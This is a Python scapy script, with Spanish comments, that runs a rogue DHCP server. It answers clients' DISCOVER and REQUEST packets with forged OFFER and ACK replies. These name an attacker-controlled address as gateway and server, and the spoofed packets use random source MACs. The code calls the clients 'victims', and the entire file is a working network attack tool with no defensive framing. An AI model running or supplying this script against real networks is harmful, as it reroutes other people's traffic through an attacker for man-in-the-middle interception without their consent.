from scapy.all import *
from random import randint

conf.checkIPaddr = False
iface = "eth0"

fake_gateway = "10.9.23.100"
fake_dns = "8.8.8.8"
mask = "255.255.255.0"

used_ips = set()

def get_ip():
    while True:
        ip = "10.9.23." + str(randint(150,200))
        if ip not in used_ips:
            used_ips.add(ip)
            return ip

print("DHCP Rogue activo...")

def dhcp_handler(pkt):

    if pkt.haslayer(DHCP):

        msg_type = pkt[DHCP].options[0][1]
        victim_mac = pkt[Ether].src
        xid = pkt[BOOTP].xid

        # DISCOVER → OFFER
        if msg_type == 1:

            offered_ip = get_ip()

            print(f"OFFER → {offered_ip} para {victim_mac}")

            offer = (
                Ether(dst=victim_mac, src=RandMAC()) /
                IP(src=fake_gateway, dst="255.255.255.255") /
                UDP(sport=67, dport=68) /
                BOOTP(op=2, yiaddr=offered_ip, siaddr=fake_gateway, xid=xid) /
                DHCP(options=[
                    ("message-type","offer"),
                    ("server_id", fake_gateway),
                    ("lease_time", 86400),
                    ("subnet_mask", mask),
                    ("router", fake_gateway),
                    ("name_server", fake_dns),
                    "end"
                ])
            )

            sendp(offer, iface=iface, verbose=False)

        # REQUEST → ACK  ⭐⭐⭐ ESTE ES EL SECRETO
        elif msg_type == 3:

            requested_ip = pkt[DHCP].options[2][1]

            print(f"ACK → {requested_ip} para {victim_mac}")

            ack = (
                Ether(dst=victim_mac, src=RandMAC()) /
                IP(src=fake_gateway, dst="255.255.255.255") /
                UDP(sport=67, dport=68) /
                BOOTP(op=2, yiaddr=requested_ip, siaddr=fake_gateway, xid=xid) /
                DHCP(options=[
                    ("message-type","ack"),
                    ("server_id", fake_gateway),
                    ("lease_time", 86400),
                    ("subnet_mask", mask),
                    ("router", fake_gateway),
                    ("name_server", fake_dns),
                    "end"
                ])
            )

            sendp(ack, iface=iface, verbose=False)

sniff(filter="udp and (port 67 or 68)", prn=dhcp_handler, iface=iface)
